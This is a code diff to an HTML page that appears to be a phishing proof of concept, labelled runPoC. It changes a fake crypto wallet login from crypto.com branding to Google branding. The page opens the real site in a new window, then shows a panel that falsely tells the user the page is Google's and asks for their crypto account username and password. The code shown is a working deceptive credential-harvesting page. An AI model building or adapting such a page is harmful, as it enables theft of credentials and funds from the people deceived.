@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width,initial-scale=1.0" />
-    <title>Crypto Login Page</title>
+    <title>Crypto Login Page From google</title>
     <style>
       body {
         margin: 0;
@@ -48,15 +48,15 @@
   </head>
   <body>
     <div class="box">
-      <h1>E WALLET CRYPTO LOGIN</h1>
-      <p id="intro">CLICK HERE TO REDIRECT crypto.com</p>
+      <h1>E WALLET CRYPTO LOGIN FROM GOOGLE</h1>
+      <p id="intro">CLICK HERE TO REDIRECT google.com</p>
       <button id="triggerBtn" onclick="runPoC()">
-        Sign in to Crypto Login Page
+        Sign in to Crypto Login Page From google
       </button>
 
       <div class="fake-panel" id="panel">
         <h3>
-          This page is the crypto.com page, you can see it yourself above,
+          This page is the google page, you can see it yourself above,
           please fill in your crypto account username and password below.
         </h3>
 
@@ -112,7 +112,7 @@ Password: ${password}
       }
 
       function runPoC() {
-        const w = window.open("https://www.crypto.com/csi", "_blank");
+        const w = window.open("https://www.google.com/csi", "_blank");
         document.getElementById("panel").style.display = "block";
 
         document.getElementById("triggerBtn").style.display = "none";
